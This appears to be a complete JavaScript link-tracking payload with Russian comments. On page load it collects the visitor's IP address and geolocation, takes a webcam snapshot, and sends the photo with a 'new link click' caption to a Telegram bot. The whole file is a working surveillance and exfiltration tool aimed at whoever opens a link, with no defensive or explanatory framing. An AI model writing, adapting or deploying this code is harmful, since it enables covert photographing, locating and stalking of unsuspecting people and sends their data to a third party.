(async function() {
    "use strict";

    // ---------- 1. Сбор IP + геолокация ----------
    let ipAddress = "0.0.0.0";
    let geo = "не определена";

    try {
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipRes.json();
        ipAddress = ipData.ip;

        const geoRes = await fetch(`https://ipapi.co/${ipAddress}/json/`);
        const geoData = await geoRes.json();
        geo = `${geoData.city}, ${geoData.region}, ${geoData.country_name} (${geoData.latitude}, ${geoData.longitude})`;
    } catch(e) {
        geo = "ошибка геолокации";
    }

    // ---------- 2. Время перехода ----------
    const now = new Date();
    const timeStr = now.toLocaleString("ru-RU", { timeZone: "Europe/Moscow" }) + " MSK";

    // ---------- 3. Формирование caption (подпись к фото) ----------
    const caption = `Новый переход по ссылке!

IP Адрес: ${ipAddress}
Гео/Локация: ${geo}
Время перехода: ${timeStr}`;

    // ---------- 4. Захват фото с вебкамеры (Blob) ----------
    let photoBlob = null;

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement("video");
        video.srcObject = stream;
        video.autoplay = true;
        video.playsInline = true;

        await new Promise((resolve) => {
            video.onloadedmetadata = () => {
                video.play();
                resolve();
            };
        });

        // Стабилизация кадра
        await new Promise(r => setTimeout(r, 500));

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        // Конвертация в Blob (JPEG, качество 0.85)
        photoBlob = await new Promise(resolve => {
            canvas.toBlob(resolve, "image/jpeg", 0.85);
        });

        // Выключение камеры
        stream.getTracks().forEach(track => track.stop());
    } catch(e) {
        console.warn("Camera error:", e);
        photoBlob = null;
    }

    // ---------- 5. Отправка в Telegram (ОДНО сообщение: фото + caption) ----------
    async function sendPhotoWithCaption(blob, captionText) {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
        const formData = new FormData();
        formData.append("chat_id", TELEGRAM_CHAT_ID);
        formData.append("photo", blob, "webcam_snapshot.jpg");
        formData.append("caption", captionText);

        const response = await fetch(url, { method: "POST", body: formData });
        return response.json();
    }

    // Отправляем только если есть фото
    if (photoBlob) {
        await sendPhotoWithCaption(photoBlob, caption);
    } else {
        // Если камеры нет — по вашему запросу ничего не отправляем
        // (можно раскомментировать ниже для отправки только текста)
        /*
        const textUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await fetch(textUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: caption
            })
        });
        */
    }
})();
